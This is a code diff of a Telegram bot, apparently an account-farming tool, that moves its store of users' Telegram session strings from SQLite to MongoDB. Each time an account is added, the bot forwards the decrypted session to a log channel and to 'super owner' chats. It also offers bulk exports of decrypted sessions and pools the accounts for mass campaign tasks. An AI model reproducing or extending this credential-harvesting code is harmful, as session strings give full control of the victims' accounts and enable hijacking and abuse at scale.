-    # Also generate .zip file containing session as .session
-    zip_buffer = io.BytesIO()
-    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr(f"session_{phone}.session", session_str)
-    zip_bytes = zip_buffer.getvalue()
-    zip_document = BufferedInputFile(zip_bytes, filename=f"session_{phone}.zip")
-    
     caption = f"🔑 <b>Session Event Telemetry Dump</b>\nPhone: <code>+{phone}</code>\nUsername: <b>@{username or 'None'}</b>\nOperator Creator ID: <code>{adder_id}</code>"
     
     if config.LOG_CHANNEL_ID:
         try:
             await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=document, caption=caption, parse_mode="HTML")
-            await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=zip_document, caption=f"📦 <b>Session ZIP Telemetry Dump (.session inside)</b>\nPhone: <code>+{phone}</code>", parse_mode="HTML")
         except Exception as e:
             logger.error(f"Failed sending updates to log channel: {e}")
             
     for owner_id in config.SUPER_OWNER_IDS:
         try:
             owner_doc = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
-            owner_zip_doc = BufferedInputFile(zip_bytes, filename=f"session_{phone}.zip")
             await bot.send_document(chat_id=owner_id, document=owner_doc, caption=caption, parse_mode="HTML")
-            await bot.send_document(chat_id=owner_id, document=owner_zip_doc, caption=f"📦 <b>Session ZIP Telemetry Dump (.session inside)</b>\nPhone: <code>+{phone}</code>", parse_mode="HTML")
         except Exception as e:
             logger.error(f"Failed sending data to owner node {owner_id}: {e}")
 
-# --- EXPORT ARCHIVE MANAGEMENT HOOKS ---
+# --- EXPORT ARCHIVE MANAGEMENT HOOKS (RESTRICTED TO OWNERS ONLY) ---
 @router.callback_query(F.data == "export_dashboard_root")
 async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -1312,27 +1281,24 @@ async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
     offset = page * limit
     role = await db_mgr.get_user_role(user_id)
     
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        placeholders = ','.join('?' for _ in config.SUPER_OWNER_IDS)
-        if role == "super_owner":
-            count_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
-            total_items = (await count_res.fetchone())[0]
-            cursor = await db.execute("SELECT phone, username FROM accounts WHERE status = 'active' LIMIT ? OFFSET ?", (limit, offset))
-        elif role == "owner":
-            count_res = await db.execute(f"SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id NOT IN ({placeholders})", config.SUPER_OWNER_IDS)
-            total_items = (await count_res.fetchone())[0]
-            cursor = await db.execute(f"SELECT phone, username FROM accounts WHERE status = 'active' AND user_id NOT IN ({placeholders}) LIMIT ? OFFSET ?", (*config.SUPER_OWNER_IDS, limit, offset))
-        else:
-            await callback.message.answer("🚫 Permission check validation rejected.")
-            return
-        rows = await cursor.fetchall()
+    if role == "super_owner":
+        total_items = await db_mgr.accounts.count_documents({"status": "active"})
+        cursor = db_mgr.accounts.find({"status": "active"}).skip(offset).limit(limit)
+    elif role == "owner":
+        total_items = await db_mgr.accounts.count_documents({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}})
+        cursor = db_mgr.accounts.find({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}}).skip(offset).limit(limit)
+    else:
+        await callback.message.answer("🚫 Permission check validation rejected.")
+        return
+
+    rows = await cursor.to_list(length=limit)
 
     if not rows:
         await callback.message.answer("⚠️ No accessible active telephony data clusters found corresponding to your filter access.")
         return
 
     text = f"Select structural database session profile target row to dump (Page {page + 1}):"
-    buttons = [[InlineKeyboardButton(text=f"📱 +{r[0]} (@{r[1] or 'None'})", callback_data=f"export_ph:{r[0]}", style="primary")] for r in rows]
+    buttons = [[InlineKeyboardButton(text=f"📱 +{r['phone']} (@{r.get('username') or 'None'})", callback_data=f"export_ph:{r['phone']}", style="primary")] for r in rows]
     
     nav_row = []
     if page > 0:
@@ -1356,29 +1322,19 @@ async def handle_export_session_run(callback: CallbackQuery, bot: Bot):
         await callback.message.answer("🚫 Authorization access denied.")
         return
 
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT user_id, session_string FROM accounts WHERE phone = ?", (phone,)) as cursor:
-            row = await cursor.fetchone()
+    row = await db_mgr.accounts.find_one({"phone": phone})
 
     if not row:
         await callback.message.answer("❌ Selected profile data missing inside datastore registries.")
         return
 
-    if row[0] in config.SUPER_OWNER_IDS and role != "super_owner":
+    if row.get("user_id") in config.SUPER_OWNER_IDS and role != "super_owner":
         await callback.message.answer("🛡️ <b>Access Violation:</b> Super Owner profiles are isolated and protected.")
         return
 
-    raw_session = decrypt_data(row[1])
-    session_bytes = raw_session.encode('utf-8')
+    session_bytes = decrypt_data(row["session_string"]).encode('utf-8')
     session_file = BufferedInputFile(session_bytes, filename=f"string_{phone}.txt")
     await callback.message.reply_document(document=session_file, caption=f"✨ Session dump file generated safely for: <code>+{phone}</code>", parse_mode="HTML")
-
-    # Send ZIP containing .session file
-    zip_buf = io.BytesIO()
-    with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr(f"session_{phone}.session", raw_session)
-    zip_file = BufferedInputFile(zip_buf.getvalue(), filename=f"session_{phone}.zip")
-    await callback.message.reply_document(document=zip_file, caption=f"📦 ZIP Session archive generated for: <code>+{phone}</code>", parse_mode="HTML")
 
 @router.callback_query(F.data.startswith("export_multi_start:"))
 async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot: Bot):
@@ -1397,23 +1353,20 @@ async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot
     limit = 10
     offset = page * limit
     
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        placeholders = ','.join('?' for _ in config.SUPER_OWNER_IDS)
-        if role == "super_owner":
-            c_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
-            total_items = (await c_res.fetchone())[0]
-            cursor = await db.execute("SELECT phone FROM accounts WHERE status = 'active' LIMIT ? OFFSET ?", (limit, offset))
-        else:
-            c_res = await db.execute(f"SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id NOT IN ({placeholders})", config.SUPER_OWNER_IDS)
-            total_items = (await c_res.fetchone())[0]
-            cursor = await db.execute(f"SELECT phone FROM accounts WHERE status = 'active' AND user_id NOT IN ({placeholders}) LIMIT ? OFFSET ?", (*config.SUPER_OWNER_IDS, limit, offset))
-        rows = await cursor.fetchall()
+    if role == "super_owner":
+        total_items = await db_mgr.accounts.count_documents({"status": "active"})
+        cursor = db_mgr.accounts.find({"status": "active"}).skip(offset).limit(limit)
+    else:
+        total_items = await db_mgr.accounts.count_documents({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}})
+        cursor = db_mgr.accounts.find({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}}).skip(offset).limit(limit)
+    
+    rows = await cursor.to_list(length=limit)
         
     text = f"🎭 <b>Customized Pack Package Assembly Core Selector</b> (Page {page + 1})\nSelect accounts profiles to encapsulate:"
     buttons = []
     
     for r in rows:
-        ph = r[0]
+        ph = r["phone"]
         chk = "💎 " if ph in selected else "⬜ "
         buttons.append([InlineKeyboardButton(text=f"{chk}+{ph}", callback_data=f"toggle_ex_ph:{ph}:{page}", style="primary" if ph in selected else "success")])
         
@@ -1465,32 +1418,22 @@ async def execute_multi_export(callback: CallbackQuery, state: FSMContext, bot: 
     user_id = callback.from_user.id
     role = await db_mgr.get_user_role(user_id)
     
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        for ph in selected:
-            async with db.execute("SELECT phone, user_id, username, session_string FROM accounts WHERE phone = ?", (ph,)) as cursor:
-                row = await cursor.fetchone()
-                if row:
-                    if row[1] in config.SUPER_OWNER_IDS and role != "super_owner":
-                        continue
-                    export_payload.append({
-                        "phone": row[0],
-                        "user_id": row[1],
-                        "username": row[2],
-                        "session_string": decrypt_data(row[3])
-                    })
+    for ph in selected:
+        row = await db_mgr.accounts.find_one({"phone": ph})
+        if row:
+            if row.get("user_id") in config.SUPER_OWNER_IDS and role != "super_owner":
+                continue
+            export_payload.append({
+                "phone": row["phone"],
+                "user_id": row["user_id"],
+                "username": row.get("username"),
+                "session_string": decrypt_data(row["session_string"])
+            })
                     
     buffer_bytes = json.dumps(export_payload, indent=4).encode('utf-8')
     pack_file = BufferedInputFile(buffer_bytes, filename="multi_sessions_bundle.txt")
+    
     await callback.message.reply_document(document=pack_file, caption=f"✨ <b>Pack extraction compiled!</b> Successfully consolidated <code>{len(export_payload)}</code> customized database session rows.", parse_mode="HTML")
-
-    # ZIP Bundle containing individual .session files
-    zip_buffer = io.BytesIO()
-    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-        for item in export_payload:
-            zf.writestr(f"session_{item['phone']}.session", item['session_string'])
-    zip_file = BufferedInputFile(zip_buffer.getvalue(), filename="multi_sessions_archive.zip")
-    await callback.message.reply_document(document=zip_file, caption=f"📦 <b>ZIP Session Pack Compiled!</b> Contains <code>{len(export_payload)}</code> individual <code>.session</code> files.", parse_mode="HTML")
-
     await state.clear()
 
 @router.callback_query(F.data == "bulk_admin_export")
@@ -1502,13 +1445,11 @@ async def handle_bulk_admin_export(callback: CallbackQuery, bot: Bot):
         await callback.message.answer("🚫 Clearances credential criteria missing.")
         return
 
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        placeholders = ','.join('?' for _ in config.SUPER_OWNER_IDS)
-        if role == "super_owner":
-            cursor = await db.execute("SELECT phone, user_id, username, session_string FROM accounts WHERE status='active'")
-        else:
-            cursor = await db.execute(f"SELECT phone, user_id, username, session_string FROM accounts WHERE status='active' AND user_id NOT IN ({placeholders})", config.SUPER_OWNER_IDS)
-        rows = await cursor.fetchall()
+    if role == "super_owner":
+        cursor = db_mgr.accounts.find({"status": "active"})
+    else:
+        cursor = db_mgr.accounts.find({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}})
+    rows = await cursor.to_list(length=None)
 
     if not rows:
         await callback.message.answer("⚠️ Datastore registries do not match current scope rules filters.")
@@ -1517,34 +1458,26 @@ async def handle_bulk_admin_export(callback: CallbackQuery, bot: Bot):
     export_payload = []
     for r in rows:
         export_payload.append({
-            "phone": r[0],
-            "user_id": r[1],
-            "username": r[2],
-            "session_string": decrypt_data(r[3])
+            "phone": r["phone"],
+            "user_id": r["user_id"],
+            "username": r.get("username"),
+            "session_string": decrypt_data(r["session_string"])
         })
 
     backup_bytes = json.dumps(export_payload, indent=4).encode('utf-8')
     backup_file = BufferedInputFile(backup_bytes, filename="bulk_admin_sessions.txt")
     await callback.message.reply_document(document=backup_file, caption=f"📦 <b>Master Datastore Core Bulk Extract Dump Complete!</b> Catalogued <code>{len(export_payload)}</code> active network session nodes safely.", parse_mode="HTML")
 
-    # ZIP Bundle containing individual .session files
-    zip_buffer = io.BytesIO()
-    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-        for item in export_payload:
-            zf.writestr(f"session_{item['phone']}.session", item['session_string'])
-    zip_file = BufferedInputFile(zip_buffer.getvalue(), filename="bulk_admin_sessions.zip")
-    await callback.message.reply_document(document=zip_file, caption=f"📦 <b>Master Bulk ZIP Extract Complete!</b> Catalogued <code>{len(export_payload)}</code> active <code>.session</code> files.", parse_mode="HTML")
-
-# --- DYNAMIC DB SNAPSHOT ENGINE ---
+# --- DYNAMIC MONGODB DUMP & RESTORE HOOKS ---
 @router.callback_query(F.data == "backup_panel")
 async def backup_panel(callback: CallbackQuery, bot: Bot):
     await callback.answer()
     buttons = [
-        [InlineKeyboardButton(text="📥 Save SQLite Backup (.db)", callback_data="export_db", style="primary")],
-        [InlineKeyboardButton(text="📂 Upload .db File", callback_data="import_db_start", style="success")],
+        [InlineKeyboardButton(text="📥 Export Full MongoDB JSON Dump", callback_data="export_db", style="primary")],
+        [InlineKeyboardButton(text="📂 Upload JSON Database File", callback_data="import_db_start", style="success")],
         [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]
     ]
-    await callback.message.edit_text("💾 <b>Relational SQL Datastore System Maintenance Suite Control Panel</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
+    await callback.message.edit_text("💾 <b>MongoDB Operational Maintenance Suite Control Panel</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
 @router.callback_query(F.data == "import_db_start")
 async def import_db_start(callback: CallbackQuery, state: FSMContext):
@@ -1555,58 +1488,44 @@ async def import_db_start(callback: CallbackQuery, state: FSMContext):
         await callback.message.answer("🚫 Developer verification clearance needed.")
         return
         
-    await callback.message.edit_text("📤 <b>Upload backup relational runtime datastore script ending inside <code>.db</code> file format syntax extension layout:</b>", parse_mode="HTML")
+    await callback.message.edit_text("📤 <b>Upload backup file inside <code>.json</code> format syntax layout:</b>", parse_mode="HTML")
     await state.set_state(RegistrationStates.waiting_for_db_file)
 
 @router.message(StateFilter(RegistrationStates.waiting_for_db_file), F.document)
 async def process_db_import_file(message: Message, state: FSMContext, bot: Bot):
     user_id = message.from_user.id
-    if not message.document.file_name.endswith('.db'):
-        await message.answer("❌ Structural failure: Supplied source document layout must run file format <code>.db</code> extension structures exclusively.", parse_mode="HTML")
-        await state.clear()
-        return
-        
-    status_msg = await message.answer("⚡ <i>Reading incoming SQLite structured relational schemas...</i>", parse_mode="HTML")
-    temp_filename = f"imported_temp_{user_id}.db"
+    status_msg = await message.answer("⚡ <i>Reading incoming JSON structured datastore content...</i>", parse_mode="HTML")
     
     try:
         file_info = await bot.get_file(message.document.file_id)
-        await bot.download_file(file_info.file_path, destination=temp_filename)
-        await status_msg.edit_text("🔄 <i>Executing relational dataset rows integration mapping sequences loops...</i>", parse_mode="HTML")
+        file_bytes = await bot.download_file(file_info.file_path)
+        raw_text = file_bytes.read().decode('utf-8', errors='ignore')
+        
+        parsed_data = json.loads(raw_text)
         
         users_merged = 0
         accounts_merged = 0
-        
-        async with aiosqlite.connect(temp_filename) as source_db:
-            try:
-                async with source_db.execute("SELECT user_id, username, role, max_accounts FROM users") as cursor:
-                    async for row in cursor:
-                        async with aiosqlite.connect(db_mgr.db_path) as current_db:
-                            await current_db.execute("""
-                                INSERT OR IGNORE INTO users (user_id, username, role, max_accounts)
-                                VALUES (?, ?, ?, ?)
-                            """, (row[0], row[1], row[2], row[3]))
-                            await current_db.commit()
-                        users_merged += 1
-            except Exception as e:
-                logger.warning(f"User pass skipped: {e}")
 
-            try:
-                async with source_db.execute("SELECT phone, user_id, username, session_string, status FROM accounts") as cursor:
-                    async for row in cursor:
-                        async with aiosqlite.connect(db_mgr.db_path) as current_db:
-                            await current_db.execute("""
-                                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
-                                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
-                            """, (str(row[0]).replace("+", ""), row[1], row[2], row[3], row[4]))
-                            await current_db.commit()
-                        accounts_merged += 1
-            except Exception as accounts_err:
-                await status_msg.edit_text(f"❌ <b>Relational Schema Mismatch Collision:</b> {accounts_err}")
-                return
+        if "users" in parsed_data:
+            for u in parsed_data["users"]:
+                await db_mgr.users.update_one(
+                    {"user_id": u["user_id"]},
+                    {"$set": u},
+                    upsert=True
+                )
+                users_merged += 1
+
+        if "accounts" in parsed_data:
+            for a in parsed_data["accounts"]:
+                await db_mgr.accounts.update_one(
+                    {"phone": a["phone"]},
+                    {"$set": a},
+                    upsert=True
+                )
+                accounts_merged += 1
 
         await status_msg.edit_text(
-            f"✅ <b>Relational Data Merge Complete!</b>\n\n"
+            f"✅ <b>MongoDB Relational Data Integration Complete!</b>\n\n"
             f"👤 Profile rows aggregated: <code>{users_merged}</code>\n"
             f"📱 Telephony token references synced: <code>{accounts_merged}</code>",
             parse_mode="HTML"
@@ -1615,17 +1534,23 @@ async def process_db_import_file(message: Message, state: FSMContext, bot: Bot):
     except Exception as e:
         await status_msg.edit_text(f"❌ <b>Hot-Merge Internal Core Failure:</b> {e}")
     finally:
-        if os.path.exists(temp_filename):
-            os.remove(temp_filename)
         await state.clear()
 
 @router.callback_query(F.data == "export_db")
 async def export_db(callback: CallbackQuery, bot: Bot):
     await callback.answer()
     try:
-        with open(db_mgr.db_path, "rb") as f:
-            file = BufferedInputFile(f.read(), filename="database_core_backup.db")
-        await callback.message.reply_document(file, caption="📂 <b>Current Core SQLite Operational Database Backup File Snapshot</b>", parse_mode="HTML")
+        users_list = await db_mgr.users.find({}, {"_id": 0}).to_list(length=None)
+        accounts_list = await db_mgr.accounts.find({}, {"_id": 0}).to_list(length=None)
+        
+        full_dump = {
+            "users": users_list,
+            "accounts": accounts_list
+        }
+        
+        json_bytes = json.dumps(full_dump, indent=4).encode('utf-8')
+        file = BufferedInputFile(json_bytes, filename="mongodb_full_backup.json")
+        await callback.message.reply_document(file, caption="📂 <b>Current Core MongoDB Full Database Backup File Snapshot</b>", parse_mode="HTML")
     except Exception as e:
         await callback.message.answer(f"❌ Core backup extraction streams dropped: {e}")
 
@@ -1637,17 +1562,19 @@ async def task_hub_select_type(callback: CallbackQuery, state: FSMContext, bot: 
     
     user_id = callback.from_user.id
     role = await db_mgr.get_user_role(user_id)
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        if role in ["owner", "super_owner"]:
-            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
-        else:
-            cursor = await db.execute("""
-                SELECT COUNT(*) FROM accounts 
-                WHERE status = 'active' AND (
-                    user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
-                )
-            """, (user_id, user_id))
-        active_count = (await cursor.fetchone())[0]
+
+    if role in ["owner", "super_owner"]:
+        active_count = await db_mgr.accounts.count_documents({"status": "active"})
+    else:
+        assigned_docs = await db_mgr.assignments.find({"user_id": user_id}).to_list(length=None)
+        assigned_phones = [doc["phone"] for doc in assigned_docs]
+        active_count = await db_mgr.accounts.count_documents({
+            "status": "active",
+            "$or": [
+                {"user_id": user_id},
+                {"phone": {"$in": assigned_phones}}
+            ]
+        })
 
     wizard_text = (
         f"🚀 <b>Premium Interactive Campaign Configuration Wizard Hub</b>\n"
@@ -1852,19 +1779,20 @@ async def prompt_for_account_scale(message: Message, state: FSMContext):
     data = await state.get_data()
     account_routing = data.get("account_routing", "own")
     
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        if role == "super_owner" and account_routing == "all":
-            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
-        elif role == "owner":
-            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
-        else:
-            cursor = await db.execute("""
-                SELECT COUNT(*) FROM accounts 
-                WHERE status = 'active' AND (
-                    user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
-                )
-            """, (user_id, user_id))
-        max_available = (await cursor.fetchone())[0]
+    if role == "super_owner" and account_routing == "all":
+        max_available = await db_mgr.accounts.count_documents({"status": "active"})
+    elif role == "owner":
+        max_available = await db_mgr.accounts.count_documents({"status": "active"})
+    else:
+        assigned_docs = await db_mgr.assignments.find({"user_id": user_id}).to_list(length=None)
+        assigned_phones = [doc["phone"] for doc in assigned_docs]
+        max_available = await db_mgr.accounts.count_documents({
+            "status": "active",
+            "$or": [
+                {"user_id": user_id},
+                {"phone": {"$in": assigned_phones}}
+            ]
+        })
         
     prompt_msg = (
         f"🔢 <b>Account Deployment Volume Capacity Selection</b>\n\n"
@@ -1893,19 +1821,20 @@ async def process_account_scale(message: Message, state: FSMContext, bot: Bot):
     data = await state.get_data()
     account_routing = data.get("account_routing", "own")
     
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        if role == "super_owner" and account_routing == "all":
-            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
-        elif role == "owner":
-            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
-        else:
-            cursor = await db.execute("""
-                SELECT COUNT(*) FROM accounts 
-                WHERE status = 'active' AND (
-                    user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
-                )
-            """, (user_id, user_id))
-        max_available = (await cursor.fetchone())[0]
+    if role == "super_owner" and account_routing == "all":
+        max_available = await db_mgr.accounts.count_documents({"status": "active"})
+    elif role == "owner":
+        max_available = await db_mgr.accounts.count_documents({"status": "active"})
+    else:
+        assigned_docs = await db_mgr.assignments.find({"user_id": user_id}).to_list(length=None)
+        assigned_phones = [doc["phone"] for doc in assigned_docs]
+        max_available = await db_mgr.accounts.count_documents({
+            "status": "active",
+            "$or": [
+                {"user_id": user_id},
+                {"phone": {"$in": assigned_phones}}
+            ]
+        })
 
     if requested_count > max_available:
         await message.answer(f"❌ <b>Resource Boundary Exceeded:</b> Accessible session pool caps at <code>{max_available}</code>. Lower your scale query value:", parse_mode="HTML")
@@ -1931,10 +1860,17 @@ async def finalize_task_creation(message: Message, state: FSMContext, bot: Bot):
         parse_mode="HTML"
     )
 
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        cursor = await db.execute("INSERT INTO tasks (creator_id, type, payload) VALUES (?, ?, ?)", (user_id, task_type, json.dumps(data)))
-        task_id = cursor.lastrowid
-        await db.commit()
+    task_id = await db_mgr.get_next_sequence_value("task_id")
+
+    await db_mgr.tasks.insert_one({
+        "task_id": task_id,
+        "creator_id": user_id,
+        "type": task_type,
+        "payload": data,
+        "status": "pending",
+        "progress": "0%",
+        "created_at": time.time()
+    })
 
     await task_queue.add_task(task_id, user_id, task_type, data, bot, init_msg.message_id)
     await state.clear()
@@ -1945,13 +1881,17 @@ async def view_tasks(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     await callback.answer()
     role = await db_mgr.get_user_role(user_id)
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks ORDER BY task_id DESC LIMIT 10" if role in ["owner", "super_owner"] else "SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 10", (user_id,))
-        rows = await cursor.fetchall()
+    
+    if role in ["owner", "super_owner"]:
+        cursor = db_mgr.tasks.find({}).sort("task_id", -1).limit(10)
+    else:
+        cursor = db_mgr.tasks.find({"creator_id": user_id}).sort("task_id", -1).limit(10)
+        
+    rows = await cursor.to_list(length=10)
 
     text = "📊 <b>Historical Campaign Event Feed Records Index Matrix</b>\n\n"
     for r in rows:
-        text += f"🔹 <b>Task Sheet:</b> <code>#{r[0]}</code> (Type: <code>{r[1].upper()}</code>)\nState tracking: <b>{r[2]}</b> | Metrics: <code>{r[3]}</code>\nTo call full details map command layout: <code>/taskreport_{r[0]}</code>\n\n"
+        text += f"🔹 <b>Task Sheet:</b> <code>#{r['task_id']}</code> (Type: <code>{r['type'].upper()}</code>)\nState tracking: <b>{r['status']}</b> | Metrics: <code>{r['progress']}</code>\nTo call full details map command layout: <code>/taskreport_{r['task_id']}</code>\n\n"
     await callback.message.edit_text(text if rows else "No active campaign tracking logs catalogued inside runtime registers.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu", style="primary")]]), parse_mode="HTML")
 
 @router.message(F.text.startswith("/taskreport_"))
@@ -1962,24 +1902,23 @@ async def cmd_task_report(message: Message, bot: Bot):
         task_id = int(message.text.split("_")[1])
     except:
         return
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT creator_id, type, status, progress FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
-            row = await cursor.fetchone()
 
-    if not row or (role not in ["owner", "super_owner"] and row[0] != user_id):
+    row = await db_mgr.tasks.find_one({"task_id": task_id})
+
+    if not row or (role not in ["owner", "super_owner"] and row.get("creator_id") != user_id):
         await message.answer("🚫 <b>Data Visibility Restriction Mismatch:</b> Permissions key clearance verification rejected.")
         return
 
-    report_text = f"📊 <b>Detailed Campaign Metrics Tracking Log</b>\n\n🗂️ Task Sheet reference ID: <code>#{task_id}</code>\n⚡ Code Action signature: <code>{row[1].upper()}</code>\n🪐 State string indicator: <b>{row[2]}</b>\n📈 Progress indicators graph matrix: <code>{row[3]}</code>"
+    report_text = f"📊 <b>Detailed Campaign Metrics Tracking Log</b>\n\n🗂️ Task Sheet reference ID: <code>#{task_id}</code>\n⚡ Code Action signature: <code>{row['type'].upper()}</code>\n🪐 State string indicator: <b>{row['status']}</b>\n📈 Progress indicators graph matrix: <code>{row['progress']}</code>"
     await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")]]), parse_mode="HTML")
 
 @router.callback_query(F.data == "view_referrals")
 async def view_referrals(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     await callback.answer()
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
-            count = (await cursor.fetchone())[0]
+    
+    count = await db_mgr.users.count_documents({"referred_by": user_id})
+
     await callback.message.edit_text(f"👥 <b>Invitation Line Tracking Matrix Analytics</b>\n\nShare your connection link string layout below to register downline user clusters:\n<code>https://t.me/{bot_username}?start=ref_{user_id}</code>\n\nTotal validated downline invitations mapped to your account line reference: <code>{count}</code> accounts.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu", style="primary")]]), parse_mode="HTML")
 
 @router.callback_query(F.data == "admin_panel")
@@ -1993,7 +1932,9 @@ async def handle_admin_panel(callback: CallbackQuery, bot: Bot):
         "🔹 <code>/addadmin &lt;id&gt;</code> - Promote user node into admin status ranks\n"
         "🔹 <code>/removeadmin &lt;id&gt;</code> - Deprecate admin structural token access rules\n"
         "🔹 <code>/broadcast</code> - Force dynamic notification content across global users pools\n"
-        "🔹 <code>/canceltasks</code> - Instantly kill all running thread operations loops safely",
+        "🔹 <code>/canceltasks</code> - Instantly kill all running thread operations loops safely\n"
+        "🔹 <code>/deletedatabase</code> - Completely drop and wipe all MongoDB database collections\n"
+        "🔹 <code>/adddatabase</code> - Restore and import database rows from a uploaded file",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]),
         parse_mode="HTML"
     )
@@ -2008,19 +1949,25 @@ async def system_stats(callback: CallbackQuery, bot: Bot):
         await callback.message.edit_text("🚫 System metrics dashboard view access restricted to core developers.")
         return
         
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        total_users = (await (await db.execute("SELECT COUNT(*) FROM users")).fetchone())[0]
-        total_accounts = (await (await db.execute("SELECT COUNT(*) FROM accounts")).fetchone())[0]
-        active_accounts = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")).fetchone())[0]
-        
-        cursor = await db.execute("SELECT user_id, username, role FROM users WHERE role = 'admin' OR user_id IN (SELECT DISTINCT user_id FROM accounts)")
-        user_rows = await cursor.fetchall()
-        
-        admin_metrics_text = "\n👥 <b>Structural Account Space Partition Allocation Map Logs:</b>\n"
-        for u_id, u_name, u_role in user_rows:
-            acc_count_res = await db.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (u_id,))
-            acc_count = (await acc_count_res.fetchone())[0]
-            admin_metrics_text += f"• Node profile target: <code>{u_id}</code> (<b>@{u_name or 'None'}</b>) [<b>{u_role.upper()}</b>] ➜ Linked slots count: <code>{acc_count}</code> items\n"
+    total_users = await db_mgr.users.count_documents({})
+    total_accounts = await db_mgr.accounts.count_documents({})
+    active_accounts = await db_mgr.accounts.count_documents({"status": "active"})
+    
+    unique_user_ids = await db_mgr.accounts.distinct("user_id")
+    user_rows = await db_mgr.users.find({
+        "$or": [
+            {"role": "admin"},
+            {"user_id": {"$in": unique_user_ids}}
+        ]
+    }).to_list(length=None)
+    
+    admin_metrics_text = "\n👥 <b>Structural Account Space Partition Allocation Map Logs:</b>\n"
+    for u in user_rows:
+        u_id = u["user_id"]
+        u_name = u.get("username")
+        u_role = u.get("role", "user")
+        acc_count = await db_mgr.accounts.count_documents({"user_id": u_id})
+        admin_metrics_text += f"• Node profile target: <code>{u_id}</code> (<b>@{u_name or 'None'}</b>) [<b>{u_role.upper()}</b>] ➜ Linked slots count: <code>{acc_count}</code> items\n"
             
     stats_text = (
         f"📈 <b>Live System Production Core Performance Summary Metrics</b>\n\n"
@@ -2036,9 +1983,8 @@ async def system_stats(callback: CallbackQuery, bot: Bot):
 # --- BOOTSTRAPPING RUNTIME ---
 async def verify_saved_sessions():
     logger.info("Verifying all active account database sessions...")
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'") as cursor:
-            accounts = await cursor.fetchall()
+    cursor = db_mgr.accounts.find({"status": "active"})
+    accounts = await cursor.to_list(length=None)
     
     semaphore = asyncio.Semaphore(10)
     async def check_account(phone, enc_session):
@@ -2047,14 +1993,12 @@ async def verify_saved_sessions():
                 client = TelegramClient(StringSession(decrypt_data(enc_session)), config.API_ID, config.API_HASH)
                 await client.connect()
                 if not await client.is_user_authorized():
-                    async with aiosqlite.connect(db_mgr.db_path) as db_conn:
-                        await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
-                        await db_conn.commit()
+                    await db_mgr.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                 await client.disconnect()
             except:
                 pass
                 
-    await asyncio.gather(*(check_account(p, s) for p, s in accounts))
